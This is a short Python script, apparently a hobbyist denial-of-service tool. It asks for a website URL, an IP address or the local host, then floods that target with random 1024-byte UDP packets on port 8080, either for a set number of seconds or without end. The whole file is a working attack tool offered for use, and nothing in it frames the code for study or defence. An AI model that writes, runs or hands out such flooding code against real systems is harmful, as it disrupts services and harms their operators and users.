import socket
import random
import time

mode = str(input("press 1 to dos with url or 2 with ip or 3 to yur router:\t"))
ip = ""
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)#opem new socket
byte = random._urandom(1024)#make random byte
port = 8080
if mode == "1":
    url = str(input("Enter Website Url:\t"))
    ip = socket.gethostbyname(url)
elif mode == "2":
    ip = str(input("Enter Website ip:\t"))
elif mode == "3":
    ip = socket.gethostbyname(socket.gethostname())
else:
    print("wrong input")
    exit()

boltimed = input("Do you want it to be timed y/n:\t")
if boltimed.lower() == "y":
    duration = input("enter how long (sec):\t")
    timeout = time.time() + int(duration)
    sent = 0
    while True:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(byte, (ip, port))
        sent += 1
        print("packet number", sent, "sent")


elif boltimed.lower() == "n":
    sent = 0
    while True:
        sock.sendto(byte, (ip, port))
        sent += 1
        print("packet number", sent, "sent")

else:
    print("wrong input")
    exit()
